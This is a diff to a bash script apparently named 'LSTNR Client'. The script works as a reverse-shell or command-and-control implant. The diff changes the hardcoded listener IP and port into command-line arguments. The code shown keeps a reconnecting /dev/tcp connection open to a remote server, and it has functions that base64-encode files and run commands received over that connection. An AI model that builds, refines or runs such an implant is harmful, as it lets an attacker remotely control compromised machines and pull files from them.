@@ -1,8 +1,40 @@
 #!/bin/bash
 
-# Configuration
-LSTNR_IP="<LSTNR_IP>"
-LSTNR_PORT=443
+# Parse command line arguments
+while [[ $# -gt 0 ]]; do
+    case $1 in
+        -s|--server)
+            SERVER_IP="$2"
+            shift 2
+            ;;
+        -p|--port)
+            SERVER_PORT="$2"
+            shift 2
+            ;;
+        -h|--help)
+            echo "Usage: $0 -s SERVER_IP -p PORT"
+            echo "LSTNR Client"
+            echo ""
+            echo "Options:"
+            echo "  -s, --server    Server IP address to connect to"
+            echo "  -p, --port      Server port to connect to"
+            echo "  -h, --help      Show this help message"
+            exit 0
+            ;;
+        *)
+            echo "Unknown option: $1"
+            exit 1
+            ;;
+    esac
+done
+
+# Check if required parameters are provided
+if [ -z "$SERVER_IP" ] || [ -z "$SERVER_PORT" ]; then
+    echo "Error: Server IP and Port are required"
+    echo "Usage: $0 -s SERVER_IP -p PORT"
+    exit 1
+fi
+
 RECONNECT_DELAY=5
 
 # Function to encode file content in base64
@@ -44,10 +76,10 @@ execute_command() {
 # Main connection loop
 while true; do
     # Create a TCP connection using /dev/tcp
-    exec 3>/dev/tcp/$LSTNR_IP/$LSTNR_PORT 2>/dev/null
+    exec 3>/dev/tcp/$SERVER_IP/$SERVER_PORT 2>/dev/null
     if [ $? -eq 0 ]; then
         exec 4<&3
-        echo "[+] Connected to $LSTNR_IP:$LSTNR_PORT"
+        echo "[+] Connected to $SERVER_IP:$SERVER_PORT"
         
         # Send initial empty data
         echo -e "\n" >&3
@@ -62,7 +94,7 @@ while true; do
             # Process commands
             case "$command" in
                 "die")
-                    echo "[!] Received die command. Shutting down..."
+                    echo "[!] Received kill-session command. Shutting down..."
                     exec 3>&-
                     exec 4>&-
                     exit 0
